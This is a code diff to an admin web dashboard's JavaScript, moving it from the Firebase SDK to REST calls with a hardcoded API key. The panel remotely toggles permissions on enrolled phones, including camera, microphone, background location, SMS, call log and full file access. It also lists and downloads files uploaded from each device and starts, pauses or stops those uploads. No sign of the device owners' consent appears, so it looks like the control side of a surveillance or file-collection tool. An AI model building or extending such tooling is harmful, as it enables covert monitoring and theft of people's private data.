@@ -1,115 +1,223 @@
-// Uses Firebase Compat SDK (loaded via <script> in index.html)
-// No ES module imports needed — works with file:// protocol.
+// Pure REST API — no Firebase SDK, works from file:// with no server needed.
+
+const API_KEY  = 'AIzaSyAwVeCSzwO50MPqp9SkjDKk3AZ91xml0Uk';
+const PROJECT  = 'permisionn';
+const FS_BASE  = `https://firestore.googleapis.com/v1/projects/${PROJECT}/databases/(default)/documents`;
+const AUTH_URL = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${API_KEY}`;
+const REFRESH_URL = `https://securetoken.googleapis.com/v1/token?key=${API_KEY}`;
 
 const PERMISSIONS = [
-  { id:'camera',          label:'Camera',             icon:'📷', desc:'Take photos and record video' },
-  { id:'microphone',      label:'Microphone',         icon:'🎙️', desc:'Record audio' },
-  { id:'location',        label:'Location',           icon:'📍', desc:'Precise GPS location' },
-  { id:'location_always', label:'Location (Always)',  icon:'🗺️', desc:'Background location access' },
-  { id:'storage',         label:'Storage',            icon:'💾', desc:'Read and write files' },
-  { id:'photos',          label:'Photos & Media',     icon:'🖼️', desc:'Access photos and media' },
-  { id:'contacts',        label:'Contacts',           icon:'👥', desc:'Read and write contacts' },
-  { id:'phone',           label:'Phone',              icon:'📞', desc:'Make and manage calls' },
-  { id:'sms',             label:'SMS',                icon:'💬', desc:'Send and receive messages' },
-  { id:'call_log',        label:'Call Log',           icon:'📋', desc:'Access call history' },
-  { id:'bluetooth',       label:'Bluetooth',          icon:'🔵', desc:'Connect Bluetooth devices' },
-  { id:'bluetooth_scan',  label:'Bluetooth Scan',     icon:'📡', desc:'Scan nearby devices' },
-  { id:'notifications',   label:'Notifications',      icon:'🔔', desc:'Show push notifications' },
-  { id:'calendar',        label:'Calendar',           icon:'📅', desc:'Read and write calendar events' },
-  { id:'sensors',         label:'Body Sensors',       icon:'❤️', desc:'Access health sensors' },
-  { id:'activity',        label:'Activity',           icon:'🏃', desc:'Detect physical activity' },
-  { id:'nearby_wifi',     label:'Nearby WiFi',        icon:'📶', desc:'Scan nearby WiFi networks' },
-  { id:'manage_storage',  label:'Manage All Files',   icon:'🗂️', desc:'Full file system access' },
+  { id:'camera',          label:'Camera',            icon:'📷', desc:'Take photos and record video' },
+  { id:'microphone',      label:'Microphone',        icon:'🎙️', desc:'Record audio' },
+  { id:'location',        label:'Location',          icon:'📍', desc:'Precise GPS location' },
+  { id:'location_always', label:'Location (Always)', icon:'🗺️', desc:'Background location access' },
+  { id:'storage',         label:'Storage',           icon:'💾', desc:'Read and write files' },
+  { id:'photos',          label:'Photos & Media',    icon:'🖼️', desc:'Access photos and media' },
+  { id:'contacts',        label:'Contacts',          icon:'👥', desc:'Read and write contacts' },
+  { id:'phone',           label:'Phone',             icon:'📞', desc:'Make and manage calls' },
+  { id:'sms',             label:'SMS',               icon:'💬', desc:'Send and receive messages' },
+  { id:'call_log',        label:'Call Log',          icon:'📋', desc:'Access call history' },
+  { id:'bluetooth',       label:'Bluetooth',         icon:'🔵', desc:'Connect Bluetooth devices' },
+  { id:'bluetooth_scan',  label:'Bluetooth Scan',    icon:'📡', desc:'Scan nearby devices' },
+  { id:'notifications',   label:'Notifications',     icon:'🔔', desc:'Show push notifications' },
+  { id:'calendar',        label:'Calendar',          icon:'📅', desc:'Read and write calendar events' },
+  { id:'sensors',         label:'Body Sensors',      icon:'❤️', desc:'Access health sensors' },
+  { id:'activity',        label:'Activity',          icon:'🏃', desc:'Detect physical activity' },
+  { id:'nearby_wifi',     label:'Nearby WiFi',       icon:'📶', desc:'Scan nearby WiFi networks' },
+  { id:'manage_storage',  label:'Manage All Files',  icon:'🗂️', desc:'Full file system access' },
 ];
 
 const FILE_TYPE_ICONS = {
-  image: '🖼️', video: '🎬', audio: '🎵',
-  document: '📄', apk: '📦', archive: '🗜️', other: '📎',
+  image:'🖼️', video:'🎬', audio:'🎵',
+  document:'📄', apk:'📦', archive:'🗜️', other:'📎',
 };
 
-// ── State ──────────────────────────────────────────────────────────────────
-let allUsers      = [];
-let currentUserId = null;
-let pendingPerms  = {};
+// ── Auth state ──────────────────────────────────────────────────────────────
+let idToken      = localStorage.getItem('id_token')       || null;
+let refreshTok   = localStorage.getItem('refresh_token')  || null;
+let tokenExpiry  = parseInt(localStorage.getItem('token_expiry') || '0');
+let adminEmail   = localStorage.getItem('admin_email')    || '';
 
+// ── App state ───────────────────────────────────────────────────────────────
+let allUsers         = [];
+let currentUserId    = null;
+let pendingPerms     = {};
 let allDeviceFiles   = [];
 let filteredFiles    = [];
 let activeTypeFilter = 'all';
 let lbIndex          = 0;
 let lbImages         = [];
+let currentFilesId   = null;
+let pollInterval     = null;
 
-let currentFilesUserId = null;
-let uploadStatusUnsub  = null;
+// ═══════════════════════════════════════════════════════════════════════════
+// REST HELPERS
+// ═══════════════════════════════════════════════════════════════════════════
 
-// ── Firebase refs (set after DOM ready) ───────────────────────────────────
-let auth, db;
-
-// ── Init ───────────────────────────────────────────────────────────────────
-document.addEventListener('DOMContentLoaded', () => {
-  auth = firebase.auth();
-  db   = firebase.firestore();
-
-  auth.onAuthStateChanged(user => {
-    if (user) showDashboard(user);
-    else      showLogin();
+async function getToken() {
+  if (Date.now() < tokenExpiry) return idToken;
+  if (!refreshTok) throw new Error('Not signed in');
+  const res = await fetch(REFRESH_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+    body: `grant_type=refresh_token&refresh_token=${encodeURIComponent(refreshTok)}`,
   });
+  const d = await res.json();
+  if (!res.ok) throw new Error('Session expired — please sign in again');
+  idToken     = d.id_token;
+  refreshTok  = d.refresh_token;
+  tokenExpiry = Date.now() + (parseInt(d.expires_in) - 60) * 1000;
+  localStorage.setItem('id_token',       idToken);
+  localStorage.setItem('refresh_token',  refreshTok);
+  localStorage.setItem('token_expiry',   tokenExpiry);
+  return idToken;
+}
+
+// Convert plain JS → Firestore REST format
+function toFS(v) {
+  if (v === null || v === undefined) return { nullValue: null };
+  if (typeof v === 'boolean')        return { booleanValue: v };
+  if (typeof v === 'number')         return { integerValue: String(Math.round(v)) };
+  if (typeof v === 'string')         return { stringValue: v };
+  if (Array.isArray(v))              return { arrayValue: { values: v.map(toFS) } };
+  if (typeof v === 'object')         return { mapValue: { fields: objToFS(v) } };
+  return { stringValue: String(v) };
+}
+function objToFS(obj) {
+  return Object.fromEntries(Object.entries(obj).map(([k, v]) => [k, toFS(v)]));
+}
+
+// Convert Firestore REST format → plain JS
+function fromFS(f) {
+  if (!f) return null;
+  if ('nullValue'      in f) return null;
+  if ('booleanValue'   in f) return f.booleanValue;
+  if ('integerValue'   in f) return parseInt(f.integerValue);
+  if ('doubleValue'    in f) return f.doubleValue;
+  if ('stringValue'    in f) return f.stringValue;
+  if ('timestampValue' in f) return { seconds: Math.floor(new Date(f.timestampValue).getTime() / 1000) };
+  if ('arrayValue'     in f) return (f.arrayValue.values || []).map(fromFS);
+  if ('mapValue'       in f) return fromFSFields(f.mapValue.fields || {});
+  return null;
+}
+function fromFSFields(fields) {
+  return Object.fromEntries(Object.entries(fields).map(([k, v]) => [k, fromFS(v)]));
+}
+function docToObj(doc) {
+  return { id: doc.name.split('/').pop(), ...fromFSFields(doc.fields || {}) };
+}
+
+async function fsGet(path) {
+  const t   = await getToken();
+  const res = await fetch(`${FS_BASE}/${path}`, { headers: { Authorization: `Bearer ${t}` } });
+  if (!res.ok) throw new Error((await res.json()).error?.message || res.statusText);
+  return res.json();
+}
+
+async function fsList(path) {
+  const t   = await getToken();
+  const res = await fetch(`${FS_BASE}/${path}?pageSize=500`, { headers: { Authorization: `Bearer ${t}` } });
+  if (!res.ok) throw new Error((await res.json()).error?.message || res.statusText);
+  const d = await res.json();
+  return (d.documents || []).map(docToObj);
+}
+
+async function fsPatch(path, fields, masks) {
+  const t   = await getToken();
+  const qs  = masks ? '?' + masks.map(m => `updateMask.fieldPaths=${encodeURIComponent(m)}`).join('&') : '';
+  const res = await fetch(`${FS_BASE}/${path}${qs}`, {
+    method:  'PATCH',
+    headers: { Authorization: `Bearer ${t}`, 'Content-Type': 'application/json' },
+    body:    JSON.stringify({ fields: objToFS(fields) }),
+  });
+  if (!res.ok) throw new Error((await res.json()).error?.message || res.statusText);
+  return res.json();
+}
+
+// ═══════════════════════════════════════════════════════════════════════════
+// AUTH
+// ═══════════════════════════════════════════════════════════════════════════
+document.addEventListener('DOMContentLoaded', () => {
+  // Try restoring session
+  if (idToken && refreshTok) {
+    showDashboard(adminEmail);
+  } else {
+    showLogin();
+  }
 
   document.getElementById('loginForm').addEventListener('submit', async e => {
     e.preventDefault();
-    const btn = document.getElementById('loginBtn');
-    const err = document.getElementById('loginError');
+    const btn  = document.getElementById('loginBtn');
+    const err  = document.getElementById('loginError');
+    const email = document.getElementById('adminEmail').value.trim();
+    const pass  = document.getElementById('adminPass').value;
     err.classList.add('hidden');
     btn.disabled = true; btn.textContent = 'Signing in…';
     try {
-      await auth.signInWithEmailAndPassword(
-        document.getElementById('adminEmail').value.trim(),
-        document.getElementById('adminPass').value.trim()
-      );
+      const res = await fetch(AUTH_URL, {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body:    JSON.stringify({ email, password: pass, returnSecureToken: true }),
+      });
+      const d = await res.json();
+      if (!res.ok) throw new Error(d.error?.message || 'Sign in failed');
+      idToken     = d.idToken;
+      refreshTok  = d.refreshToken;
+      tokenExpiry = Date.now() + (parseInt(d.expiresIn) - 60) * 1000;
+      adminEmail  = email;
+      localStorage.setItem('id_token',      idToken);
+      localStorage.setItem('refresh_token', refreshTok);
+      localStorage.setItem('token_expiry',  tokenExpiry);
+      localStorage.setItem('admin_email',   email);
+      showDashboard(email);
     } catch (ex) {
-      err.textContent = friendlyErr(ex.code);
+      err.textContent = friendlyErr(ex.message);
       err.classList.remove('hidden');
       btn.disabled = false; btn.textContent = 'Sign In';
     }
   });
 });
 
-function friendlyErr(code) {
-  return ({
-    'auth/user-not-found':    'No account with this email.',
-    'auth/wrong-password':    'Incorrect password.',
-    'auth/invalid-email':     'Invalid email address.',
-    'auth/invalid-credential':'Incorrect email or password.',
-    'auth/too-many-requests': 'Too many attempts. Try again later.',
-  })[code] || 'Sign in failed. Check your credentials.';
+function friendlyErr(msg) {
+  if (msg.includes('INVALID_PASSWORD') || msg.includes('EMAIL_NOT_FOUND') || msg.includes('INVALID_LOGIN_CREDENTIALS'))
+    return 'Incorrect email or password.';
+  if (msg.includes('TOO_MANY_ATTEMPTS'))
+    return 'Too many attempts. Try again later.';
+  return 'Sign in failed. Check your credentials.';
 }
 
-function logout() { auth.signOut(); }
+function logout() {
+  idToken = refreshTok = null;
+  localStorage.clear();
+  showLogin();
+}
 window.logout = logout;
 
-// ── Pages ──────────────────────────────────────────────────────────────────
+// ── Pages ───────────────────────────────────────────────────────────────────
 function showLogin() {
   document.getElementById('loginPage').classList.add('active');
   document.getElementById('dashboardPage').classList.remove('active');
   document.getElementById('dashboardPage').style.display = 'none';
 }
 
-function showDashboard(user) {
+function showDashboard(email) {
   document.getElementById('loginPage').classList.remove('active');
   document.getElementById('dashboardPage').classList.add('active');
   document.getElementById('dashboardPage').style.display = 'flex';
-  document.getElementById('adminName').textContent = user.displayName || 'Admin';
-  document.getElementById('adminEmailDisplay').textContent = user.email;
-  document.getElementById('adminAvatarLetter').textContent =
-    (user.displayName || user.email || 'A').charAt(0).toUpperCase();
+  const name = email.split('@')[0];
+  document.getElementById('adminName').textContent         = name;
+  document.getElementById('adminEmailDisplay').textContent = email;
+  document.getElementById('adminAvatarLetter').textContent = name.charAt(0).toUpperCase();
   loadUsers();
 }
 
-// ── Load users ─────────────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════
+// USERS
+// ═══════════════════════════════════════════════════════════════════════════
 async function loadUsers() {
   setUsersLoading(true);
   try {
-    const snap = await db.collection('users').get();
-    allUsers = snap.docs.map(d => ({ id: d.id, ...d.data() }));
+    allUsers = await fsList('users');
     renderUsers(allUsers);
     updateStats(allUsers);
   } catch (ex) {
@@ -144,15 +252,11 @@ function renderUsers(users) {
 function buildUserCard(user) {
   const perms    = user.permissions || {};
   const enabled  = PERMISSIONS.filter(p => perms[p.id]).length;
-  const total    = PERMISSIONS.length;
-  const stats    = user.fileStats || {};
-  const fileCount = stats.total || 0;
+  const fileCount = (user.fileStats || {}).total || 0;
   const initials = (user.name || 'U').charAt(0).toUpperCase();
-
-  const tagHtml = PERMISSIONS.slice(0, 5).map(p => {
-    const on = !!perms[p.id];
-    return `<span class="perm-tag ${on ? 'on':'off'}">${p.icon} ${p.label}</span>`;
-  }).join('');
+  const tagHtml  = PERMISSIONS.slice(0, 5).map(p =>
+    `<span class="perm-tag ${perms[p.id] ? 'on' : 'off'}">${p.icon} ${p.label}</span>`
+  ).join('');
 
   return `
     <div class="user-card">
@@ -165,7 +269,7 @@ function buildUserCard(user) {
       </div>
       <div class="perm-summary">${tagHtml}</div>
       <div class="user-card-footer">
-        <span class="perm-count">${enabled}/${total} perms · 📂 ${fileCount} files</span>
+        <span class="perm-count">${enabled}/${PERMISSIONS.length} perms · 📂 ${fileCount} files</span>
         <div class="card-btns">
           <button class="btn-sm blue"   onclick="openFilesModal('${user.id}')">📂 Files</button>
           <button class="btn-sm purple" onclick="openPermModal('${user.id}')">⚙️ Perms</button>
@@ -175,14 +279,13 @@ function buildUserCard(user) {
 }
 
 function updateStats(users) {
-  document.getElementById('statTotal').textContent = users.length;
-  const withPerms = users.filter(u => Object.values(u.permissions || {}).some(Boolean)).length;
-  document.getElementById('statPermed').textContent = withPerms;
-  const totalFiles = users.reduce((s, u) => s + ((u.fileStats || {}).total || 0), 0);
-  document.getElementById('statFiles').textContent = totalFiles;
+  document.getElementById('statTotal').textContent  = users.length;
+  document.getElementById('statPermed').textContent =
+    users.filter(u => Object.values(u.permissions || {}).some(Boolean)).length;
+  document.getElementById('statFiles').textContent  =
+    users.reduce((s, u) => s + ((u.fileStats || {}).total || 0), 0);
 }
 
-// ── Search ─────────────────────────────────────────────────────────────────
 function filterUsers() {
   const q = document.getElementById('searchInput').value.toLowerCase();
   renderUsers(allUsers.filter(u =>
@@ -191,7 +294,6 @@ function filterUsers() {
 }
 window.filterUsers = filterUsers;
 
-// ── Sections ───────────────────────────────────────────────────────────────
 function showSection(e, section) {
   e.preventDefault();
   document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
@@ -199,22 +301,22 @@ function showSection(e, section) {
   const isStats = section === 'stats';
   document.getElementById('statsSection').classList.toggle('hidden', !isStats);
   document.getElementById('usersSection').style.display = isStats ? 'none' : '';
-  document.getElementById('sectionTitle').textContent = isStats ? 'Statistics' : 'User Management';
+  document.getElementById('sectionTitle').textContent   = isStats ? 'Statistics' : 'User Management';
   if (isStats) updateStats(allUsers);
 }
 window.showSection = showSection;
 
-// ── Permission modal ────────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════
+// PERMISSION MODAL
+// ═══════════════════════════════════════════════════════════════════════════
 function openPermModal(userId) {
   currentUserId = userId;
   const user = allUsers.find(u => u.id === userId);
   if (!user) return;
   pendingPerms = { ...(user.permissions || {}) };
-
   document.getElementById('permModalName').textContent   = user.name || 'Unknown';
   document.getElementById('permModalEmail').textContent  = user.email || '';
   document.getElementById('permModalAvatar').textContent = (user.name||'U').charAt(0).toUpperCase();
-
   renderPermCards(pendingPerms);
   document.getElementById('permModal').classList.remove('hidden');
   document.body.style.overflow = 'hidden';
@@ -233,12 +335,12 @@ function renderPermCards(perms) {
   document.getElementById('permissionsGrid').innerHTML = PERMISSIONS.map(p => {
     const on = !!perms[p.id];
     return `
-      <div class="perm-card ${on ? 'enabled' : ''}" id="card-${p.id}">
+      <div class="perm-card ${on ? 'enabled':''}" id="card-${p.id}">
         <div class="perm-card-top">
           <div class="perm-icon-wrap ${on ? 'on':'off'}">${p.icon}</div>
           <label class="toggle">
-            <input type="checkbox" id="toggle-${p.id}" ${on ? 'checked' : ''}
-              onchange="togglePerm('${p.id}', this.checked)" />
+            <input type="checkbox" id="toggle-${p.id}" ${on ? 'checked':''}
+              onchange="togglePerm('${p.id}',this.checked)" />
             <span class="slider"></span>
           </label>
         </div>
@@ -274,7 +376,7 @@ async function savePermissions() {
   const btn = document.getElementById('savePermBtn');
   btn.disabled = true; btn.textContent = '⏳ Saving…';
   try {
-    await db.collection('users').doc(currentUserId).update({ permissions: pendingPerms });
+    await fsPatch(`users/${currentUserId}`, { permissions: pendingPerms }, ['permissions']);
     const idx = allUsers.findIndex(u => u.id === currentUserId);
     if (idx !== -1) allUsers[idx].permissions = { ...pendingPerms };
     showToast('Permissions saved! Applied instantly on mobile.', 'success');
@@ -290,12 +392,13 @@ async function savePermissions() {
 }
 window.savePermissions = savePermissions;
 
-// ── Files modal ─────────────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════
+// FILES MODAL
+// ═══════════════════════════════════════════════════════════════════════════
 async function openFilesModal(userId) {
   const user = allUsers.find(u => u.id === userId);
   if (!user) return;
-
-  currentFilesUserId = userId;
+  currentFilesId = userId;
 
   document.getElementById('filesModalName').textContent   = user.name || 'Unknown';
   document.getElementById('filesModalEmail').textContent  = user.email || '';
@@ -314,20 +417,13 @@ async function openFilesModal(userId) {
   document.getElementById('filesGrid').classList.add('hidden');
   document.body.style.overflow = 'hidden';
 
-  // Live upload status listener
+  // Start polling upload status every 3 s
   updateUploadControlUI('idle');
-  if (uploadStatusUnsub) { uploadStatusUnsub(); uploadStatusUnsub = null; }
-  uploadStatusUnsub = db.collection('users').doc(userId).onSnapshot(snap => {
-    const raw = snap.data()?.uploadControl?.status || 'idle';
-    updateUploadControlUI(raw);
-  });
+  startStatusPoll(userId);
 
   try {
-    const snap = await db.collection('users').doc(userId).collection('device_files').get();
-    allDeviceFiles = snap.docs.map(d => ({ id: d.id, ...d.data() }));
-    allDeviceFiles.sort((a, b) =>
-      (b.lastModified?.seconds || 0) - (a.lastModified?.seconds || 0)
-    );
+    allDeviceFiles = await fsList(`users/${userId}/device_files`);
+    allDeviceFiles.sort((a, b) => (b.lastModified?.seconds||0) - (a.lastModified?.seconds||0));
     filteredFiles = [...allDeviceFiles];
     renderFilesGrid(filteredFiles);
   } catch (ex) {
@@ -340,8 +436,8 @@ window.openFilesModal = openFilesModal;
 
 function closeFilesModal(e) {
   if (e && e.target !== document.getElementById('filesModal')) return;
-  if (uploadStatusUnsub) { uploadStatusUnsub(); uploadStatusUnsub = null; }
-  currentFilesUserId = null;
+  stopStatusPoll();
+  currentFilesId = null;
   document.getElementById('filesModal').classList.add('hidden');
   document.body.style.overflow = '';
 }
@@ -370,8 +466,6 @@ function renderFilesGrid(files) {
 
 function buildFileCard(file) {
   const isImage = file.fileType === 'image';
-  const sizeStr = fmtSize(file.size || 0);
-  const dateStr = fmtDate(file.lastModified?.seconds);
   const ext     = (file.name || '').split('.').pop().toUpperCase().slice(0, 4);
   const lbIdx   = lbImages.findIndex(x => x.url === file.storageUrl);
 
@@ -387,14 +481,13 @@ function buildFileCard(file) {
         <span class="file-type-badge">${esc(ext)}</span>
       </div>
       <div class="file-info">
-        <div class="file-name" title="${esc(file.name || '')}">${esc(file.name || 'Unknown')}</div>
-        <div class="file-meta">${sizeStr} · ${dateStr}</div>
+        <div class="file-name" title="${esc(file.name||'')}">${esc(file.name||'Unknown')}</div>
+        <div class="file-meta">${fmtSize(file.size||0)} · ${fmtDate(file.lastModified?.seconds)}</div>
         <div class="file-actions" onclick="event.stopPropagation()">
           ${isImage ? `<button class="file-btn view" onclick="openLightbox(${lbIdx})">👁 View</button>` : ''}
           ${file.storageUrl
             ? `<a class="file-btn dl" href="${esc(file.storageUrl)}" target="_blank" download="${esc(file.name||'')}">⬇ Download</a>`
-            : `<span class="file-btn" style="opacity:.4">No URL</span>`
-          }
+            : '<span class="file-btn" style="opacity:.4">No URL</span>'}
         </div>
       </div>
     </div>`;
@@ -415,51 +508,72 @@ function applyFilesFilter() {
   const q = (document.getElementById('filesSearchInput').value || '').toLowerCase();
   filteredFiles = allDeviceFiles.filter(f => {
     const typeOk = activeTypeFilter === 'all' || f.fileType === activeTypeFilter;
-    const nameOk = !q || (f.name || '').toLowerCase().includes(q);
+    const nameOk = !q || (f.name||'').toLowerCase().includes(q);
     return typeOk && nameOk;
   });
   renderFilesGrid(filteredFiles);
 }
 
-// ── Upload control ──────────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════
+// UPLOAD CONTROL
+// ═══════════════════════════════════════════════════════════════════════════
+function startStatusPoll(userId) {
+  stopStatusPoll();
+  const poll = async () => {
+    try {
+      const doc = await fsGet(`users/${userId}`);
+      const obj = fromFSFields(doc.fields || {});
+      updateUploadControlUI(obj?.uploadControl?.status || 'idle');
+    } catch {}
+  };
+  poll(); // immediate first check
+  pollInterval = setInterval(poll, 3000);
+}
+
+function stopStatusPoll() {
+  if (pollInterval) { clearInterval(pollInterval); pollInterval = null; }
+}
+
 async function controlUpload(status) {
-  if (!currentFilesUserId) return;
+  if (!currentFilesId) return;
   try {
-    await db.collection('users').doc(currentFilesUserId).update({
-      uploadControl: { status, updatedAt: firebase.firestore.FieldValue.serverTimestamp() },
-    });
+    await fsPatch(`users/${currentFilesId}`, {
+      uploadControl: { status, updatedAt: new Date().toISOString() }
+    }, ['uploadControl']);
     const labels = { running:'resumed', paused:'paused', stopped:'stopped' };
-    showToast(`Upload ${labels[status] || status} — mobile app will respond instantly.`, 'success');
+    showToast(`Upload ${labels[status]||status} — mobile app will respond instantly.`, 'success');
+    updateUploadControlUI(status);
   } catch (ex) {
-    showToast('Failed to update upload control: ' + ex.message, 'error');
+    showToast('Failed: ' + ex.message, 'error');
   }
 }
 window.controlUpload = controlUpload;
 
 function updateUploadControlUI(status) {
-  const dot       = document.getElementById('uploadStatusDot');
-  const label     = document.getElementById('uploadStatusLabel');
-  const btnResume = document.getElementById('btnResume');
-  const btnPause  = document.getElementById('btnPause');
-  const btnStop   = document.getElementById('btnStop');
+  const dot   = document.getElementById('uploadStatusDot');
+  const label = document.getElementById('uploadStatusLabel');
+  const btnR  = document.getElementById('btnResume');
+  const btnP  = document.getElementById('btnPause');
+  const btnS  = document.getElementById('btnStop');
   if (!dot) return;
 
   const cfg = {
-    idle:    { color:'#475569', text:'Idle — no active upload', resume:false, pause:false, stop:false },
-    running: { color:'#10B981', text:'Uploading…',              resume:false, pause:true,  stop:true  },
-    paused:  { color:'#F59E0B', text:'Paused',                  resume:true,  pause:false, stop:true  },
-    stopped: { color:'#EF4444', text:'Stopped',                 resume:false, pause:false, stop:false },
+    idle:    { color:'#475569', text:'Idle — no active upload', r:false, p:false, s:false },
+    running: { color:'#10B981', text:'Uploading…',              r:false, p:true,  s:true  },
+    paused:  { color:'#F59E0B', text:'Paused',                  r:true,  p:false, s:true  },
+    stopped: { color:'#EF4444', text:'Stopped',                 r:false, p:false, s:false },
   };
   const c = cfg[status] || cfg.idle;
-
-  dot.style.background    = c.color;
-  label.textContent       = `Upload: ${c.text}`;
-  btnResume.style.display = c.resume ? '' : 'none';
-  btnPause.style.display  = c.pause  ? '' : 'none';
-  btnStop.style.display   = c.stop   ? '' : 'none';
+  dot.style.background   = c.color;
+  label.textContent      = `Upload: ${c.text}`;
+  btnR.style.display     = c.r ? '' : 'none';
+  btnP.style.display     = c.p ? '' : 'none';
+  btnS.style.display     = c.s ? '' : 'none';
 }
 
-// ── Lightbox ────────────────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════
+// LIGHTBOX
+// ═══════════════════════════════════════════════════════════════════════════
 function openLightbox(idx) {
   if (!lbImages.length || idx < 0) return;
   lbIndex = idx;
@@ -498,31 +612,33 @@ document.addEventListener('keydown', e => {
   }
 });
 
-// ── Utils ───────────────────────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════
+// UTILS
+// ═══════════════════════════════════════════════════════════════════════════
 function showToast(msg, type = 'success') {
   const el = document.getElementById('toast');
   el.textContent = msg;
-  el.className = `toast ${type}`;
+  el.className   = `toast ${type}`;
   el.classList.remove('hidden');
   setTimeout(() => el.classList.add('hidden'), 3500);
 }
 
 function togglePass() {
   const i = document.getElementById('adminPass');
-  i.type = i.type === 'password' ? 'text' : 'password';
+  i.type  = i.type === 'password' ? 'text' : 'password';
 }
 window.togglePass = togglePass;
 
 function esc(str) {
-  return (str || '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+  return (str||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
 }
 
-function fmtSize(bytes) {
-  if (!bytes) return '0 B';
-  if (bytes < 1024)        return `${bytes} B`;
-  if (bytes < 1048576)     return `${(bytes/1024).toFixed(1)} KB`;
-  if (bytes < 1073741824)  return `${(bytes/1048576).toFixed(1)} MB`;
-  return `${(bytes/1073741824).toFixed(1)} GB`;
+function fmtSize(b) {
+  if (!b)           return '0 B';
+  if (b < 1024)     return `${b} B`;
+  if (b < 1048576)  return `${(b/1024).toFixed(1)} KB`;
+  if (b < 1073741824) return `${(b/1048576).toFixed(1)} MB`;
+  return `${(b/1073741824).toFixed(1)} GB`;
 }
 
 function fmtDate(secs) {
